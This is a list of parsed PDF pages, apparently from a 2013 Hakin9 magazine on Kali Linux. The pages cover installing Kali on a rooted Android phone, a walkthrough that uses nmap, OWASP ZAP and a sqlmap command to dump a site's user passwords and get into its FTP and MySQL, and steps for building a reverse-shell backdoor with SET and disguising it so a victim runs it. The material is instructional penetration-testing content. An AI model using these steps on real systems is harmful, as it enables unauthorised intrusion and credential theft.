https://wiki.debian.org/EikaMX#What_is_EikaMX.3F  – For Introduction of EFIKAMX chipset\\n•  http://www.infosecisland.com/blogview/22236-Backtrack-5-r3 -List-of-Some-of-the-New-Tools-and-Programs.html  – \\nFor introduction to new tools added to BackTrack\\n•  http://www.beagleboard.org  – Introduction to BeagleBone Chipset and it’s working\\n•  http://www.backtrack-linux.org/  – All about BackTrack and it’s feature.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 14}, page_content='A BZ Media Event  \\nBig Data TechCon™is a trademark of BZ Media LLC.“Big Data TechCon is loaded with great networking \\nopportunities and has a good mix of classes with te chnical\\ndepth, as well as overviews. It’s a good, technical ly-focused\\nconference for developers.”\\n—Kim Palko, Principal Product Manager, Red Hat\\n“Big Data TechCon is great for beginners as well as \\nadvanced Big Data practitioners. It’s a great conference!”\\n—Ryan Wood, Software Systems Analyst, Government of Canada\\n“If you’re in or about to get into Big Data, this is the \\nconference to go to.”\\n—Jimmy Chung, Manager, Reports Development, AvectraDiscover how to master Big Data from real-world practitioners – instructors \\nwho work in the trenches and can teach you from real-world experience!Big Data gets real \\natBig Data TechCon!\\nSan Francisco\\nOctober 15- 17, 2013\\nwww.BigDataTechCon.com• Collect, sort and store massive quantities\\nof structured and unstructured data\\n• Process real-time data pouring into\\nyour organization\\n• Master Big Data tools and technologies\\nlike Hadoop, Map/Reduce, NoSQL \\ndatabases, and more• Learn HOW TO integrate data-collection \\ntechnologies with analysis and \\nbusiness-analysis tools to produce \\nthe kind of workable information\\nand reports your  organization needs\\n• Understand HOW TO leverage Big Data \\nto help your organization todayOver 60how-to \\npractical classes\\nand tutorials \\nto choose\\nfrom!\\nThe HOW-TO conference for Big Data and IT professionalsCome to Big Data TechCon to learn the best ways to:'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 15}, page_content='Extra 03/2013 16AT TACK\\nThe global market is flooded, ruled by android-\\nbased mobile devices and smartphones. \\nMobile phones are becoming smaller and \\nhave greater processing power. These devic -\\nes with mobile internet and wireless connectivity \\nhave revolutionised businesses and work method -\\nologies. Tasks like connectivity, sharing, process \\nautomation and extensive computing over smart -\\nphones have become the norm. The android oper -\\nating system has made smartphones and mobile \\ndevices, a very powerful tool in the hands of secu -\\nrity professionals and even deadlier in the hands \\nof black hats.\\nAndroid is a very popular operating system for \\nmobile devices such as smartphones and tablets. \\nInitially developed by Android Inc. and then bought \\nby Google in 2005. Android is an Open Handset \\nAlliance product and released under the Apache \\nlicense. The power of Android platform lies in the \\nthousands of apps running on it, backed by a strong \\nand active open source developer community. Used \\nby 70% of the mobile developer community, thus making it the most widely used platform. It is con -\\nsidered a highly customisable and scalable mobile-\\nbased distribution, making it widely accepted foun -\\ndation base for community-driven mobile projects. \\nAndroid Architecture Overview \\nAndroid devices, built on Linux kernel version 2.6 \\nand the first commercially distribution made avail -\\nable on HTC Dream handset in 2008. Since then \\nnumerous updates have incrementally improved \\nthe operating system base and added new and \\nimproved functionality. The latest official release \\nis Jelly Bean 4.3 with a slogan „An even sweet -\\ner Jelly Bean”. Android’s user interface uses touch \\ninputs to correspond to real world actions. These \\nresponses are immediate, with vibrations and hap -\\ntic feedback capabilities. The Android framework is \\nvery extensive as it has a layered approach. It has \\nfive layers, the kernel and low-level tools, the na -\\ntive libraries, the android runtime with Dalvik virtual \\nmachine, the framework layer is on top of this and \\nfinally the applications run above everything. Weaponization of \\nAndroid Platform using \\nKali Linux\\nKali Linux has become the most popular tool for \\nprofessional penetration testing and security auditing. \\nIn this article, we will review how to couple the \\nfunctionality of Kali Linux with Android platform \\nover HTC One X smartphone to create an invincible \\npenetration-testing weapon.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 16}, page_content='www.hakin9.org/en 17Weaponization of Android Platform  using Kali Linux \\nThe Linux kernel is written in C/C++ and the \\nframework is written in java and runs on Dalvik vir -\\ntual machine. The present kernel is 3.0.x and has \\nadded support for Bluetooth and Wi-Fi encryption. \\nAndroid is built to run on devices with little main \\nmemory and low powered CPU’s. Majority of the \\nmodules are made to consume low power. The ac -\\ntual android runtime consists of Dalvik virtual ma -\\nchine and java libraries. All applications in android \\ndevices run in their own sandboxed Dalvik virtu -\\nal machines. Each applications runs with its own \\nunique user id and in its own process. Android has \\nvery efficient memory and power management. \\nAndroid has support for various APIs, has media \\nframework, integrated internet browser support, \\nhighly optimised graphics, camera, GPS, compass, \\nand accelerometer sensors. The applications can \\nbe easily created using SDKs and are available \\nusing the various apps markets. The biggest ap -\\nps market is Google Play where one can find vari -\\nous apps in categories and using searches. Apart \\nfrom the default Google Play, there are many oth -\\ner app stores to download and install apps. Table \\n01 provides a list of widely used open markets, but \\nmake sure not to trust anyone blindly in the present \\nscenarios of malicious apps and malware threats. \\nAlways disable USB debugging and uncheck the \\n“Unknown sources” option under Settings >> Ap -plications menu to keep your android device safe \\nfrom such tampering (Figure and Table 1).\\nTable 1. List of available Android App Stores\\nSl # Apps Market Url\\n01 Google Play https://play.google.com/store?hl=en\\n02 Amazon store http://www.amazon.com/mobile-\\napps/b?node=2350149011\\n03 GetJar http://www.getjar.mobi/\\n04 Slide ME http://slideme.org/\\n05 F-Droid https://f-droid.org/\\n06 Appoke http://beta.appoke.com/\\n07 Appia http://appia.com/\\n08 App Brain http://www.appbrain.com/\\n09 Android Pit http://www.androidpit.com/\\n10 Handango http://www.handango.com/Home.\\njsp?siteId=2218\\n11 Handster http://www.handster.com/\\n12 Mobango http://in.mobango.com/\\n13 Opera Store http://apps.opera.com/en_in/\\n14 Soc.io http://soc.io/\\n15 Insyde Market http://www.insydemarket.com/\\n16 AppsFire http://appsire.com/\\n17 Aptoide http://www.aptoide.com/\\nFigure 1.  Android Architecture, taken from wiki\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 17}, page_content='Extra 03/2013 18AT TACK\\nIntroduction to the HTC One X Mobile \\nPhone\\nThe HTC One X smartphone is a pretty power -\\nful device with 1.5 GHz, quad core (global ver -\\nsion) CPU speed, Android 4.1 with smart sense \\n4, screen size of 1280x720 (HD, 720p) with 1GB \\nRAM 16/24 GB Flash Memory and Wi-Fi, Blue -\\ntooth, NFC, USB connectivity and multi-sensors \\n(Gyro sensor, G-Sensor, Digital Compass, Proxim -\\nity sensor and Ambient light sensor).\\nIntroduction to Kali Linux\\nOffensive Security the creators of Backtrack Linux \\nhave a new catchy tag line “the quitter you become, \\nthe more you are able to hear”, with this Zen man -\\ntra the focus is stealth. Kali Linux was created for \\nstealth and attack, this amazing distribution is an \\nadvanced and more versatile version of Backtrack \\never created. This distribution is geared towards \\nprofessional penetration testers and security audi -\\ntors. Kali has gone beyond any live cd distro and \\nmoved into the category of a full-fledged operat -\\ning system. It has moved to a solid base of Debi -\\nan modules and is completely File Hierarchy Sys -\\ntem (FHS) compliant. All directories appear under \\nthe main root directory “/”, and have the ability to \\nbe stored and accessed on physical or virtual de -\\nvices. The main “/pentest” directory from previous \\nBacktrack5 release has been removed in this ver -\\nsion named Kali. Now the user can execute any tool \\nfrom anywhere in the file-system, irrespective of its \\ninstalled location. The second advantage of Kali is \\nits support for ARM hardware and ability to boot -\\nstrap the installation directly from the repositories. \\nKali operating system has over three hundred \\npenetration testing tools and wireless device sup -\\nport. Its kernel is highly patched and network \\nservices are disabled by default making it more \\nsecure. Kali is not just for network security profes -\\nsionals, beginners can also start learning about \\ncyber security using this distribution. Whether you \\nare pentesting wireless, exposing server vulner -\\nabilities, performing a web application based ex -\\nploit, learning, or doing social engineering, Kali is \\nthe one-stop-shop for all security needs. Kali is \\nfree and now ported on Android based smartphone \\nto be taken anywhere.\\nKali Linux has many well-known tools like \\nMetasploit, Injection capable wireless drivers, Kis -\\nmet, John, Zap Proxy, Nmap, Ophcrack, Ettercap, \\nHydra, etc. These tools are all categorised in fif -\\nteen different categories for various purposes. The \\nfifteen categories are: Top 10 Security Tools, In -\\nformation Gathering, Vulnerability Analysis, Web \\nApplications, Password Attacks, Wireless Attacks, Exploitation Tools, Sniffing/Spoofing, Maintain -\\ning Access, Reverse Engineering, Stress Testing, \\nHardware Hacking, Forensics, Reporting Tools \\nand System Services. Kali Linux is running Debian \\nXFCE and comes with vim as default text editor. \\nAll the standard applications and accessories are \\npre-installed and ready to run. For weaponizing \\nAndroid platform with Kali Linux, we will require an \\nunlocked & rooted device.\\nHow to unlock the HTC One X Bootloader \\nand Root the device?\\nIt is important to understand the difference be -\\ntween Unlocking the Bootloader and rooting mo -\\nbile devices. Unlocking the Bootloader provides \\nthe user with the option to change the stock oper -\\nating system on the mobile device. However, root -\\ning is the process of modifying or altering the de -\\nfault operating system shipped with the device to \\ngain complete control over it. \\nThis means that the limitations of carriers and \\nvarious manufacturers put on the device is eas -\\nily bypassed, extended functionality is accessed \\nwithout any problems, custom modules and up -\\ngrades can be added without any limitations. Gen -\\nerally, manufacturers and carriers do not usually  \\nFigure 3.  Warranty Void\\nFigure 2.  Unlock Bootloader\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 18}, page_content='www.hakin9.org/en 19Weaponization of Android Platform  using Kali Linux \\nrecommend rooting. HTC provides instructions on \\ntheir website to unlock the Bootloader for HTC One \\nX, but by performing this operation, the user voids \\nall warranty on the device. The systematic instruc -\\ntions to unlock the Bootloader for HTC One X are \\npresent on the HTC Dev site. Make sure HTC Driv -\\ners are installed on the PC and the mobile phone \\ncan connect and be recognised as HTC Device \\nvia USB cable. Once the device gets connected \\nsuccessfully to the PC, login to the HTCDev web -\\nsite with the registered user name and password. \\nStart by selecting Unlocking Your Bootloader and \\nthen select “All Other Supported Models” under \\nthe Supported Devices section, click Begin Unlock \\nBootloader to start the wizard.\\nThe website prompts to sign a disclaimer that \\nclearly states, the warranty is void and proceed -\\ning further would mean that every repair would be \\ncharged. The website wizard finishes by request -\\ning the device Token ID extracted from the mobile \\nphone. Then based on the Token ID, HTC releases \\nthe unlock code block to release the mobile de -\\nvice. The “unlock.bin” file received is, used to flash \\nthe device and the Bootloader gets unlocked. Next \\nstep is to install SuperSu app, which is an access \\nmanagement tool. Now with root privilege on the \\nmobile device, Kali Linux can be installed. There \\nare two methods to install Kali Linux on Android:\\n•  Method 01: Install Kali GUI using Linux Deploy \\nApp,\\n•  Method 02: Install Kali Command Line Inter -\\nface (CLI) using Chroot Environment.\\nMethod 01: Install Kali gUI using Linux \\nDeploy App\\nRequirements : Rooted HTC One X mobile with 4GB \\nfree space, Linux Deploy App & Android VNC Viewer.\\nMethodology\\n•  Install Linux Deploy and conigure \\nthese values: Distribution=Kali Linux , \\nArchitecture=armel , VNC: Screen Width=1920 , VNC: \\nScreen Height=1280 , (Figure 4-6)\\n•  Scroll up click Install  to inish the download and \\ninstall of Kali Linux over Wi-Fi,\\n•  After completion, go back to the Settings and \\nselect Reconigure  option,\\n•  Once reconiguration is complete, run the serv -\\ner using the START  option,\\n•  Install Android VNC-Viewer and conigure \\nthese values: Nickname=Kali , Set Port=5900 , \\nPassword=changeme , Color Options = 4bpp better \\nquality video  (Figure 7-9).\\nFigure 4.  Linux Deploy\\nFigure 6.  Install inish\\nFigure 5.  Click Install\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 19}, page_content='Extra 03/2013 20AT TACK\\nClick on the Connect button to ire away. Ka -\\nli Linux GUI will show up. This method effectively \\nshows to deploy Kali GUI over Android.\\nOptional 01\\nKali distribution can be updated by running the be -\\nlow command from a terminal prompt:\\nsudo apt-get update && sudo apt-get upgrade && \\nmsfupdate\\nOptional 02\\nArmitage tool can also be added. Armitage is a \\nscriptable tool for Metasploit that visualizes tar -\\ngets, recommends exploits and exposes the ad -\\nvanced post-exploitation features in the Metasploit \\nframework. It has many features for discovery, \\naccess, post-exploitation, and manoeuvre, which \\nmakes is more effective. The command to install \\nArmitage is:\\napt-cache search armitage && apt-get install \\narmitage\\nMethod 02: Install Kali Command Line \\nInterface (CLI) using Chroot environment\\nIn this method the chroot operation is used to deploy \\nKali Linux. The chroot operation changes the root \\ndirectory for the current running processes and its \\nchildren processes by creating and hosting a sepa -\\nrate virtualised environment. Any program deployed \\nusing this operation is confined to the defined base \\ndirectory. Here the chroot operation is used to setup \\nthe Kali Linux platform for pentesting.\\nRequirements\\nRooted HTC One X mobile device with 6GB free \\nspace, BusyBox free app & Terminal Emulator app.\\nMethodology\\n•  Download pre-compiled chroot kali distribution \\nfrom http://googl/qmGle . Mirror: https://archive.\\norg/details/Kali.nogui.armel.zitstif.chroot.482013\\n MD5: d60c5a52bcea35834daecb860bd8a5c7\\n SHA1: f62c2633d214de9edad1842c9209f443bcea385d\\n•  Extract the downloaded archive onto phone’s \\ninternal storage folder /sdcard/kali ,\\n•  Kali folder contains three iles, hashsum, ‘kali’ \\nshell script and ‘kali.img’ ile (Figure 10),\\n•  Install Terminal Emulator app.To run the Kali \\nchroot environment use the below command:\\n Figure 9.  Kali Linux booting\\nFigure 8.  VNC-Viewer\\nFigure 7.  Server started\\nFigure 10.  Extracted folder containing kali.img\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 20}, page_content='www.hakin9.org/en 21Weaponization of Android Platform  using Kali Linux \\n*Note: Kali ile requires permissions to be an exe -\\ncutable and we can set it using this command irst:\\nChmod 755 /sdcard/kali/kali\\nthen use this command to run Kali\\nsu -c /sdcard/kali && sh kali\\nOptional 01\\nTerminal Emulator can be configured to start the \\nsession directly in the Kali chroot environment by \\nadding the following command in: Preferences >> \\nInitial Command\\nsu -c “cd /sdcard/kali && sh kali”\\nOptional 02\\nUpdate the distribution by using the following com -\\nmand:\\napt-get update && apt-get upgrade && msfupdate\\nOptional 03\\nEnhance functionality by adding below mentioned \\ntools from app store.\\nSummary\\nKali Linux GUI or CLI both are equally powerful \\nwhen combined with Android Platform. The begin -\\nners can start using kali GUI on mobile device and \\nthe more experienced who are comfortable with the \\nterminals can have fun using kali CLI. In the future, \\nmore mobile-based tools and apps are going to \\nflood the markets and we need to start using mobile \\ndevices and smartphones as they and becoming \\ninexpensive and more functional. Hope this article \\nis helpful, informative and encourages you towards \\nthe field of cyber security and pentesting.\\nDANIeL SINgH\\nDaniel Singh (CEH, ECSA) is Cyber-securi -\\nty consultant and prominent speaker at \\nDefcon Indian Regional Chapters. He has \\nover thirteen years of experience in scien -\\ntiic software development, network/da -\\ntabase administration, business & data \\nanalysis. He has worked in various roles, i.e.; coding, testing, \\ndatabase and network administration to senior analyst. Cur -\\nrently he works as an Independent consultant in network and \\nsystems security. Apart from consulting, he is active in train -\\ning & mentoring upcoming security professionals. He has var -\\nied interests including malware analysis, open source intelli -\\ngence gathering, reversing, ofensive security and hardware \\nhacking. Email: Daniel@techngeeks.com\\n Figure 12.  Metasploit in Kali chroot\\nFigure 11.  Kali chroot prompt\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 21}, page_content='Extra 03/2013 22AT TACK\\nTable 2. Tools for enhancing functionality\\nApp Name Description\\nAndFTP ftp/sftp client\\nAndroid Hackers shows complete android info\\nAndroidVNC  vnc viewer client\\nAndSMB Android Samba client\\nAntennas shows mobile antennas and much \\nmore info\\nAnyTAG NFC \\nLauncher Automate your phone by scanning \\nNFC tags\\nAPG OpenGPG for Android\\nAPK Dumper copies apk of selected apps\\nApp List Backup says what it does\\nBugtroid pentesting and forensics\\nCardTest Test your NFC enabled credit cards\\nChecksum GUI tool for md5sum and shasum tools\\nConnectBot powerful ssh client\\nDNS Lookup perform DNS and WHOIS lookups\\nDolphin Browser browser that easily allows you to \\nchange your UserAgent\\nDroidcat inspired by irecat\\nDroidsheep Security analysis in wireless \\nnetworks\\nDroidsheep Guard app for monitoring Androids ARP-table\\nDroidSQLi automated MySQL injection tool\\ndSploit Android Network Penetration Suite\\nElectronic \\nPickpocket wirelessly read NFC enabled cards\\nExif Viewer shows exif data from photos and can \\nremove this information\\nFast notepad simple but useful notepad \\napplication\\nFind My Router’s \\nPassword title explains it all (mostly for default \\npasswords)\\nFing very similar to Look@LAN tool for \\nWindows\\nGoomanager front end for android ile hosting\\nHacker’s Keyboard as the name says\\nHashPass translate text into hashes\\nHex Editor hex editor for Android\\nHex Pirate hex editor for Android\\ninSSIDer wireless network info\\nintercepter-NG mutli-function network tool, snifer, \\ncookie intercepter, arp poisoner\\nIP info Detective detailed information regarding the \\nIP address\\nIP Webcam Android device into an IP security \\ncamera\\nLoggy view your logcat in your desktop browserMaluuba voice activated assistant\\nnetwork \\ndiscoveryComputer/device discovery and port \\nscanner\\nNetwork Signal Info graphical tool for iwconig\\nnetwork tools periodic monitoring of websites, \\nservers, routers, surveillance \\nsystems, etc\\nNFC ReTAG Re-use write protected NFC Tags \\nsuch as hotel key-cards, access \\nbadges, etc\\nNFC TagInfo another NFC reader\\nobackup Easily backup your entire device to \\nthe cloud in one tap\\nOpenVPN Connect open vpn client\\nOrbot tor on Android\\nPacket Injection poorman’s GUI version of scapy\\nportknocker as name says\\nProxyDroid use your socks5 proxy with this \\napplication\\npython for \\nandroidas name says\\nrekey app that ixes the recently-disclosed \\n“Master Key” vulnerabilities\\nRoot Browser great ile manager for Android\\nSandroProxy kind of like Webscarab\\nScreenshot \\nUltimate to take screenshots\\nSecret Letter poorman’s stegonagraphy tool\\nsmanager script manager\\nsmart taskbar as name says\\nSSHDroid openssh server for android\\nSTUN Client app to ind out what kind of irewall/\\nNAT you’re behind by using the \\nSTUN protocol.\\nSU Update ixer as name says\\nSupersu manage what programs access root \\nfunctions\\nTeamviewer remotely control Windows, OSX, and \\nLinux based systems\\nTerminal Emulator no explanation needed\\ntimely alarm\\ntPacketCapture as name says\\nVirusTotal Uploader test your malicious payloads\\nVoodoo OTA \\nRootKeeper maintain root access even after \\nupdates\\nWii File Transfer access iles on your phone from a \\nweb browser via an http server\\nWiiFinder simple wireless scanner\\nWiGLE Wii Open-source wardriving app\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 22}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 23}, page_content='Extra 03/2013 24AT TACK\\nKali Linux is probably one of the distributions \\nmore complete for the realization of pene -\\ntration test. This is accompanied by many \\ntools of all kinds. In this article we’ll see some ex -\\namples on how to perform attacks using only some \\nof the Top Ten tools of Kali Linux focusing on those \\nthat are designed to attack web servers...\\nGenerally an attack is performed as follows:\\n•  Collection/information gathering.\\n•  Anonymity.\\n•  Search vulnerabilities.\\n•  Exploitation of the systems.\\n•  Post exploitation.\\n•  Elimination of proofs.\\n•  Executive and technical report.\\nWe will focus on the following: Information Gath -\\nering, search vulnerabilities, exploitation and Post \\nexploitation .\\nIt is important to know that:  in this article you are \\nworking with a series of tools for a specific pur -\\npose, but this does not mean that the tool can only \\nbe used for this purpose. The vast majority of the \\ntools have multiple uses.\\nNmap: Information gathering\\nWhen we are ready to perform an attack, the first \\nand most important step is the collection of infor -mation. Knowing all the potential weak points is \\nour goal. To do this the first thing that we are going \\nto do is to conduct a port scan with nmap. In this \\nway we will know what type of services or applica -\\ntions run under the web server.\\nAs shown in Figure 1, we see the result of a basic \\nscanning launched from nmap , more specifically  Kali Linux, Attacking \\nServers\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. Just \\nby using some of the ‘Top Ten’ tools of Kali Linux.\\nFigure 1.  Result of scan with Zenmap. Multiples open ports\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 24}, page_content='www.hakin9.org/en 25Kali Linux, Attacking Servers\\nfrom Zenmap , the graphical version of nmap. The \\nscan showed a few open ports on the server, and \\nthis may give us some clues as to where to find \\npotential vulnerabilities. The information which has \\ntaken us back is quite juicy, the server that we are \\nattacking has more of a role assigned, therefore \\nmore points to that attack.Some of the services that are attacked :\\nPort 21 FTP\\nPort 110 pop3\\nPort 3306 mysql\\nThese will probably be the most vulnerable, be -\\ncause the rest of which ports are open on the serv -\\ner have a connection with the security type SSL or \\nTLS, as is the case of HTTPS, SMTPS, POP3S \\nor of the SSH. These protocols and their connec -\\ntion, have a very robust encryption, which is why it \\nis more complex to obtain a key using brute force, \\nor crack a password snifing the trafic on a LAN.\\nAs an example; both by the port 21 as the 110 \\ncould be attempting to perform a brute-force at -\\ntack. On the other hand, we have port 3306 that \\ntells us that mysql installed.\\nWe will do some checking typical to perform a pen -\\netration test, such as trying to access an anonymous \\nuser FTP, or verify access to mysql is enabled.\\nIn Figure 2, shows how the mysql Backend can \\nonly be accessed from within the LAN itself. \\nHowever, having a mysql installed and see so \\nmany open ports makes us think that the web that \\nwe are attacking have more than one database \\ndedicated to various services, for example, for the \\nmain page, a database, for the blog other, and so \\non for each part of the web. This can mean that \\nsome of the parts of the web page is vulnerable.\\nOWASP: Search vulnerabilities\\nOnce that we have some information on the objec -\\ntive, the next step will be to seek vulnerabilities with \\nFigure 2.  Acces denied for mysql backend\\nFigure 3.  Automatic full scan with OWASP ZAP\\nFigure 4.  Report in html from OWASP\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 25}, page_content='Extra 03/2013 26AT TACK\\nthe OWASP tool. At the time of use OWASP we \\ncan use this of two different ways. The first of them \\nwould be to use OWASP as a proxy in our browser, \\nintercepting and all the connections that are made \\nwith Firefox, Chrome, or any other browser.\\nIn this way we can establish the attack in a sin -\\ngle point, that is to say, possibly the web to which \\nwe are attacking has multiple URL, between the \\nBLOG, the main page, the access to the extranet, \\naccess to suppliers, and so on using as a proxy \\nOWASP interceptions exclusively part of the web \\nserver that we want to attack.The other way to use OWASP to search for vul -\\nnerabilities is doing a full scan of the web site.\\nLater I’ll show you how to do it. This option is \\nless advised that the previous one, however, can \\nhelp us in the time to search for these vulnerabili -\\nties, this method is faster. It is less advisable to use \\nthis method, or better said, the handicaps of using \\nas a proxy is, that if you do a full scan on a web -\\nsite, OWASP runs through all the URL of the page \\nand tries to find vulnerabilities in each of the par -\\nties of the web. This implies that the IDS or firewall \\nof server to that we are attacking can detect an in -\\ntrusion attempt.\\nOWASP when perform a full scan, launches all \\npossible attacks, grouping the vulnerabilities found \\nbased on their criticality.\\nIn the image below (Figure 3) we see the result \\nobtained by OWASP on a full scan of the web site \\nthat we are attacking.\\nOnce that we already have the result of the scan -\\nning, the most advisable is to perform a first look \\nat the potential vulnerabilities, and then export it in \\n.HTML in order to be able to focus on those vulner -\\nabilities that we are the most interested in.\\nFigure 4 is the result already exported and in de -\\ntail on the vulnerabilities found. \\nOne of the vulnerabilities found was a XSS (cross \\nsite scripting) and to exploit it is as simple as go \\nto the browser and insert the URL which showed \\nOWASP. Figure 5, is the result of XSS.\\nFigure 8.  Results of the table containing the passwords\\n Figure 7.  Results of the table containing the users\\nFigure 6.  Showing the databases with sqlmap\\nFigure 5.  XSS (cross site scripting) exploited\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 26}, page_content='www.hakin9.org/en 27Kali Linux, Attacking Servers\\nSQLmap: exploiting vulnerabilities\\nAfter verifying that the fault discovered by OWASP \\nare exploitable, we spent a sqlmap where we en -\\ntered a field a bit more fun.\\nAmong other vulnerabilities, we found a possible \\nfailure of SQL injection.\\nThe first thing is to check whether there is such \\nfailure by entering the URL that showed us OWASP.\\nKnowing that is vulnerable, we used sqlmap tool \\nto automate the processes of SQL injection.\\nThe same as it happens with OWASP, there are \\ntwo ways to use sqlmap, one of them would be us -ing the wizard, and the other entering the param -\\neters one by one.\\nFor example: we’d use the following command to \\nknow which are the DATABASE of server (Figure 6).\\nsqlmap -u http://www.website.es/actualidad/evento.\\nphp?id=110 --level=5 --lush-session –dbs\\nThen the options that we offer sqlmap, would get \\nthe tables from a database, after, then users, and \\nso on up to obtain the passwords. It could even \\nmake a dump of all the DB.\\nSometimes the users and passwords are in dif -\\nferent tables, however this is not a problem, we \\ncannot continue with the process of intrusion. Fig -\\nures 7 and 8 show the users and passwords in dif -\\nferent tables.\\nTo do a dump of these two tables, we get the \\naccount_id  and the password (Figure 9), which in \\naddition, seeing the user name I suppose it is the \\nuser that gives access to the FTP.\\nAnd as we saw earlier, one of the open ports was \\nprecisely the 21. Thus, we tried to enter and ... \\nWe’re already inside!\\nNavigating a little for folders on the ftp we realize \\nthat the website has a blog with Wordpress (Figure \\n10). This makes it easier for us once more to get \\naccess to the system ...\\nWe downloaded the file wp-config to view the \\nuser that connects with the Wordpress Database, \\nand we try to connect to a mysql client (Figure 11).\\nSummary\\nWith only 3 programs we have obtained full access \\nand with root permissions to Mysql. Also, we have \\nhad access to the FTP server where are housed all \\nof the files of the web site, and where we could get \\na remote shell.\\nThese 3 tools are in the Top Ten of Kali Linux. These \\nare without doubt the tools to be considered in order \\nto make hacking attacks and penetration testing.\\nISMAeL gONzáLez D.\\nIsmael Gonzalez D. is a security research -\\ner with an experience of over 7 years in the \\nstudy of web vulnerabilities. He is currently \\ncertiied in CEH, MCP, MCDTS, MCSA, LPIC-1. \\nFounder and publisher of computer securi -\\nty blog (http://kontrol0.com). Writer of the \\nbook Backbox 3 – Initiation to pentesting, \\nfreely distributed and completely free (http://www.scribd.com/\\ndoc/157067606/BackBox-3-Iniciacion-al-Pentesting).\\nFigure 9.  Dump of users data and passwords\\nFigure 11.  Full access to the Mysql Server with mysql client\\nFigure 10.  Full access to the FTP server\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 27}, page_content='Extra 03/2013 28AT TACK\\nBackdoor is a security hole that can exist in a \\ncomputer program or operating system that \\ncould allow the invasion of the system so \\nthat the attacker can get a full control of the ma -\\nchine.\\nReferring to a backdoor, this is a ‘backdoor’ that may be exploited via the Internet, but the term can \\nbe used more broadly to describe ways of stealthy \\nobtaining privileged information systems of all \\nkinds.\\nThere are cases where the computer program \\ncan contain a ‘backdoor’ implemented at the time it Hands-on: How To \\nCreate ‚Backdoor’ \\nTo Remote Access With Kali Linux\\nNow I will introduce you to a technique that will use SET \\n(social engineering toolkit) available in Linux Kali ...\\nLet’s create a backdoor that can be used to remotely control \\na Windows computers.\\nWe will create an executable legitimate, hardly detected by \\nany antivirus, so we complete a computer target.\\nI want to point out that all the information here should be \\nused for educational purposes or penetration test, because \\nthe invasion of unauthorized devices is crime.\\nFigure 3.  Enter the IP adress, Step 3\\nFigure 2.  Create the Payload and Listener, Step 2\\nFigure 1 . Social Engineering Toolkit, Step 1\\nFigure 4.  Set payload, Step 4\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 28}, page_content=\"www.hakin9.org/en 29Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\nwas compiled. Generally this feature is interesting \\nwhen software must perform update operations or \\nvalidation.\\nStep to Step\\nI hope to do a walkthrough theoretically simple:\\nFirst we access the menu: “Applications/Kali \\nLinux/Exploitation Tools/Social Engineering Tool -\\nkit” and click “seetoolkit”. It will be a menu like that \\nseen in the Figure 1. In the options menu select \\noption 1.\\nIn the second menu select option 4 (Figure 2).\\nIn this screen below you should properly input \\nyour IP address. If you have questions open a new \\nterminal and type ifconfig eth0  then fill in this field \\ncorrectly (Figure 3).\\nIn the screenshot below, you should choose the \\nsecond option to create a connection reverse, our target computer is who will connect to the attack -\\ner (Figure 4). In the screenshot below to watch 3 \\nsteps we perform first the kind of backdoor, type \\n16, then we must define the portal site, the attack -\\ner’s machine that will be ‘listening’ for connection \\nattempts made   by the target. The default port is \\n443 you can choose to change the port if it is al -\\nready being used. We can enter another number \\nand then press ‘Enter’, Next you’re asked whether \\nto start ‘listening’, you must enter ‘yes’ (Figure 5).\\nWith these procedures the ‘backdoor’ will be cre -\\nated and our computer will begin to ‘listen’ for con -\\nnections from the target machines.\\nThe executable is created in the folder /usr/\\nshare/set/  and is called ‘msf.exe‘.\\nThe goal is to make it an executable, then we \\ncan open a new terminal and type the following \\ncommand\\n‘chmod + x / usr / share / set / msf.exe‘\\nFigure 6.  Starting interaction, Step 6\\nFigure 5.  Start the listener, Step 5\\nFigure 8.  Ettercap, Step 2\\nFigure 7. Ettercap, Step 1\\n Figure 9.  Ettercap, Step 3\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 29}, page_content='Extra 03/2013 30AT TACK\\nIf you want to you can rename this ile to facil -\\nitate the process of social engineering to con -\\nvince someone to opening a photo or install a \\nnew application.Now we need to copy this executable to the tar -\\nget machine and so it runs a Figure 6.\\nHere to enter the command ‘sessions’ can list the \\ntargets already connected.\\nWhen we type ‘sessions -i 1’ (assuming 1 is the \\nID number displayed by the command ‘sessions‘, if \\nanother number is displayed just change the num -\\nber shown by 1)  we will be able to interact with the \\ntarget machine with full access.\\nDNS spoofing attack with ettercap\\nINTRODUCTION\\nDNS spoofing is a method in which the attacker com -\\npromises a name server (Domain Name System).\\nThe server accepts and incorrectly uses the in -\\nformation from a ‘host’ who has no authority to pro -\\nvide this information.\\nUsing this technique, the attacker can direct the \\nvictim’s browser or email to their own server.\\nThe technique consists of the data that is entered 